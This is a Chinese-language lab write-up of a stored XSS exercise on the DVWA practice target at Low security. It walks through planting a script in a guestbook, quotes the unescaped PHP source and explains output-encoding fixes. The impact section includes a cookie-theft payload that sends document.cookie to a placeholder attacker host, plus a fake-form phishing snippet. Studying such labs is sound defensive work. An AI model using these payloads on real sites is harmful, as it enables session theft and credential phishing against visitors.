# DVWA XSS（存储型，Low）在留言板里种脚本

> 靶场：DVWA / XSS (Stored)，安全等级 Low
> 环境：同 02 篇（Kali + PHP 内置服务器 + Burp）
> 日期：2026-10-21
> 性质：本地授权靶场

---

## 一、目标

把脚本提交进留言板，确认它**存进数据库**并且**每次访问都会执行**，理解存储型 XSS 与反射型的区别。

## 二、过程

### 2.1 提交 payload

左侧 **XSS (Stored)**，填表：

- Name：`test`
- Message：`<script>alert(1)</script>`

点 **Sign Guestbook** → 弹窗出现。

### 2.2 确认「存住了」

刷新页面时，Firefox 会弹「确认重新提交表单」（因为刚才是 POST）：

- 点 **Cancel**（不要 Resend，否则重复入库）
- 再点左侧 **XSS (Stored)** 重新进入页面

**弹窗再次出现** → 脚本确实在数据库里，页面加载时被读出来执行。

### 2.3 看源码

`vulnerabilities/xss_s/source/low.php`：

```php
$message = stripslashes( $_POST[ 'mtxMessage' ] );
$name    = stripslashes( $_POST[ 'txtName' ] );

// 直接拼接 INSERT，不转义
$query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";

// 读取时也不转义
echo "<div id='guestbook'> <ul> <li>{$message}</li> </ul> </div>";
```

**写入和输出两个环节都没有编码**，所以脚本可以长期驻留。

## 三、和反射型的区别

| 维度 | 反射型 | 存储型 |
|---|---|---|
| payload 在哪 | URL 参数 | 数据库 |
| 触发方式 | 受害者点链接 | **打开页面就触发** |
| 影响范围 | 单个点击者 | **所有访问者** |
| 危害等级 | 中 | 高 |

真实场景中，存储型 XSS 常出现在留言板、评论区、个人签名、日志展示页。

## 四、能造成什么后果

```html
<!-- 窃取 Cookie（若没设 HttpOnly） -->
<script>document.location='http://attacker/?c='+document.cookie</script>

<!-- 伪造页面内容、钓密码 -->
<script>document.body.innerHTML='<form>...</form>'</script>

<!-- 蠕虫：自动发帖传播 -->
```

## 五、修复

| 措施 | 说明 |
|---|---|
| 输出编码（核心） | 显示留言时用 `htmlspecialchars` |
| 输入过滤 | 白名单、长度限制，但**不能只靠过滤** |
| HttpOnly | 给 Session Cookie 加 HttpOnly，防脚本读取 |
| CSP | 限制内联脚本 |

正确写法：

```php
echo htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
```

## 六、踩坑

- **刷新 POST 页面会弹「确认重新提交表单」**：选 Cancel 即可，Resend 会重复提交。
- **别只刷新，要点菜单重新进页面**：这样才能确认数据是从数据库读出来的。

## 七、收获

- 存储型 XSS 的关键特征是**持久化**：关掉浏览器、换个人来，脚本还在。
- 防御要点在**输出编码**，而不只是「存之前过滤」——数据可能来自数据库、API、其他系统，只有输出端能统一兜底。
